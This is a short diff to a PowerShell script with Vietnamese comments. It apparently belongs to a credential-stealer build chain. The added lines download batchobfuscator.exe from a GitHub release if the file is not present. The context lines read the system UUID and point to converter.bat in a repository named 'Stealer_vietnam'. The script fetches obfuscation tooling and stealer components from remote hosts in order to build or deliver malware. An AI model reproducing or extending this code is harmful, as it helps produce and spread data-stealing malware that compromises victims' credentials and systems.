@@ -1,3 +1,20 @@
+# Đặt đường dẫn đến file cần kiểm tra
+$filePath = ".\batchobfuscator.exe"
+
+# Kiểm tra xem file có tồn tại không
+if (-Not (Test-Path $filePath)) {
+    # Nếu không tồn tại, tải xuống file từ URL
+    $url = "https://github.com/s1uiasdad/batch-obfuscator-made-in-python/releases/download/AutoBuild/batchobfuscator.exe"
+    Write-Host "File không tồn tại. Đang tải xuống từ $url..."
+    
+    # Tải xuống file
+    Invoke-WebRequest -Uri $url -OutFile $filePath
+    
+    Write-Host "Tải xuống hoàn tất."
+} else {
+    Write-Host "File đã tồn tại."
+}
+
 # Lấy UUID của hệ thống
 
 $url = "https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/converter.bat"
